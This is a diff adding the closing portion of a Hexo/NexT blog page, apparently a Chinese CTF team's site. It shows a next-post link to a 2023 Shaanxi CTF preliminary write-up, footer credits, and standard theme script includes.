+                <a href="/2023/06/05/2023%E9%99%95%E8%A5%BF%E7%9C%81CTF%E5%88%9D%E8%B5%9B/" rel="next" title="2023陕西省CTF初赛">
+                  2023陕西省CTF初赛 <i class="fa fa-angle-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="beian"><a href="https://beian.miit.gov.cn/" rel="noopener" target="_blank">浙ICP备2022023783号-1 </a>
+  </div>
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2024</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">nnnpc、commit、Eureka</span>
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/next-theme-pjax/0.6.0/pjax.min.js" integrity="sha256-vxLn1tSKWD4dqbMRyv940UYw4sXgMtYcK6reefzZrao=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/next-boot.js"></script><script src="/js/pjax.js"></script>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.1/search.js" integrity="sha256-1kfA5uHPf65M5cphT2dvymhkuyHPQp5A53EGZOnOLmc=" crossorigin="anonymous"></script>
+<script src="/js/third-party/search/local-search.js"></script>
+
+
+
+
+
+
+
+  
+
+
+
+
+
+</body>
+</html>
